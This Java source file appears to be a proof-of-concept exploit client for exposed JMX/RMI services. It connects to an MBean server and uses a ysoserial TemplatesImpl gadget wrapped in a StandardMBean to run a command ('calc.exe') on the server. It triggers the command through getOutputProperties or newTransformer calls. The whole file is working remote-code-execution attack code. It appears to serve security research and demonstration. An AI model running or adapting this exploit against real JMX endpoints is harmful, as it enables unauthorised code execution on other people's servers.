package jmxcodewhitesec;

import ysoserial.payloads.util.Gadgets;

import javax.management.*;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;
import javax.xml.transform.Templates;
import java.io.IOException;
import java.util.Map;
import java.util.Properties;

public class Client {
    public static void main(String[] args) throws Exception {
        // connect to MBean server
        String url = "service:jmx:rmi:///jndi/rmi://127.0.0.1:2222/jmxrmi";
        JMXServiceURL serviceURL = new JMXServiceURL(url);
        Map env = new Properties();
        MBeanServerConnection connection = JMXConnectorFactory.connect(serviceURL, env).getMBeanServerConnection();

        // create ObjectName for new MBean
        ObjectName objectName = new ObjectName("Test:type=test");

        try {
            // create TemplatesImpl (not detailed here)
            Object templatesImpl = Gadgets.createTemplatesImpl("calc.exe");

            // create StandardMBean on MBean server
            // calls `StandardMBean(T, Class<T>)` constructor with `templatesImpl` and `Templates.class`
            String className = StandardMBean.class.getName();
            String[] ctorArgTypes = new String[] { Object.class.getName(), Class.class.getName() };
            Object[] ctorArgs = new Object[] { templatesImpl, Templates.class };
            try {
                connection.createMBean(className, objectName, ctorArgs, ctorArgTypes);
                // any of the following works
                // invokes getOuputProperties() indirectly via attribute getter
                connection.getAttribute(objectName, "OutputProperties");
                // invoke getOutputProperties() directly
                connection.invoke(objectName, "getOutputProperties", new Object[0], new String[0]);
                // invoke newTransformer() directly
                connection.invoke(objectName, "newTransformer", new Object[0], new String[0]);
            } catch (ReflectionException | InstanceAlreadyExistsException | MBeanException |
                     NotCompliantMBeanException | AttributeNotFoundException | InstanceNotFoundException e) {
                throw new RuntimeException(e);
            }

        } finally {
            try {
                connection.unregisterMBean(objectName);
            } catch (InstanceNotFoundException | MBeanRegistrationException e) {
            }
        }
    }
}
